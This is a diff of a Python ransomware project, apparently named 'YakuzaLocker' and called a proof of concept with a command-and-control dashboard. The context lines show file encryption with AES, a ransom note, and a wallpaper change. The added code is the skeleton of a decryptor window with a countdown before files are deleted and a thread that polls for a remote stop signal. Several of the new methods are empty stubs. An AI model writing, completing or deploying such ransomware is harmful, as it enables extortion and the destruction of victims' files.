@@ -12,7 +12,7 @@ from datetime import datetime
 from json import dumps
 from os import makedirs, path, remove, walk
 # import tkinter as tk
-from tkinter import Toplevel, Entry, Label, Button, simpledialog, FLAT, messagebox
+from tkinter import Toplevel, Entry, Label, Button, simpledialog, FLAT, messagebox, Tk
 from uuid import uuid4
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
@@ -21,7 +21,7 @@ from Crypto.Util.Padding import pad
 from requests import post, exceptions
 from time import sleep
 from PIL import Image, ImageTk
-
+from threading import Event, Thread
 
 """ Part 1: Application functions """
 # Defining Function to load the current path of ransom.py and then join it to relative_path
@@ -355,7 +355,8 @@ Your Security Team
         logging.info("[+] Wallpaper Set Successfully.")
         logging.info("[+] Encryption Process Completed. All files now encrypted.")
 
-
+""" Part 5: from TerminationKeyDialog() class to DeletionCountdownDialog() class,
+Step 17 to Step 27 """
 # Define Termination Key Dialog class for user interactions
 class TerminationKeyDialog(Toplevel):
     """ in this class, we have a dialog box to get the termination key from the user
@@ -434,6 +435,7 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
         # Set the Position of the window to the center of the screen
         self.geometry(f"+{positionRight}+{positionDown}")
 
+
 # Define CountdownDialog class for countdown interactions
 class CountdownDialog(Toplevel):
     """ in this class, we have a countdown timer to show the user how much time left to enter the decryption key """
@@ -504,6 +506,7 @@ class CountdownDialog(Toplevel):
 
         # Set count down in the Center of the Screen
         self.geometry(f"+{positionRight}+{positionDown}")
+
 
 # DeletionCountdownDialog class for deletion countdown interactions
 class DeletionCountdownDialog(Toplevel):
@@ -578,6 +581,56 @@ class DeletionCountdownDialog(Toplevel):
         else:
             messagebox.showerror("Error", "Incorrect secondary termination key.")
 
+
+""" Part 6: Define DecryptorApp(tk.Tk) class
+Step 28 to Step 30"""
+
+class DecryptorApp(Tk):
+    """ in this class, we have all tools for decrypting the files as methods and functions """
+    def __init__(self):
+        super().__init__()
+        # Set window title, icon, background and size
+        self.iconbitmap(ICON_PATH)
+        self.title("YakuzaLocker")
+        self.configure(bg='black')
+        self.geometry("900x800")
+
+        # below variable used for control the deletion before decryption process
+        self.timerUpdateId = None
+        self.stopDeletion = False
+        self.deletionStopped = False
+
+        # Call initialize_ui() method to initialize Decryptor App UI
+        self.initialize_ui()
+
+        # Set Protocol to close windows
+        self.protocol("WM_DELETE_WINDOW", self.on_close_window)
+        # Create an event to stop the deletion process
+        self.stopEvent = Event()
+
+        # Load machine id and check it to load timer after that
+        self.machineId = load_machine_id()
+        if self.machineId:
+            self.load_timer_state()
+        else:
+            # Show error in message box which say cant load machine id and destroy UI
+            messagebox.showerror("Error", "[-] No machine ID found. The application will exit.")
+            self.destroy()
+
+        # Start multithread for Checking Self Destroy Remote signal from POC-C&C Dashboard
+        Thread(target=self.check_for_remote_stop_signal, args=self.machineId, daemon=True).start()
+
+    def check_for_remote_stop_signal(self, machine_id, check_interval=10):
+        pass
+
+    def initialize_ui(self):
+        pass
+
+    def on_close_window(self):
+        pass
+
+    def load_timer_state(self):
+        pass
 
 # if __name__ == "__main__":
 #     # Create an instance of the EncryptionTool class
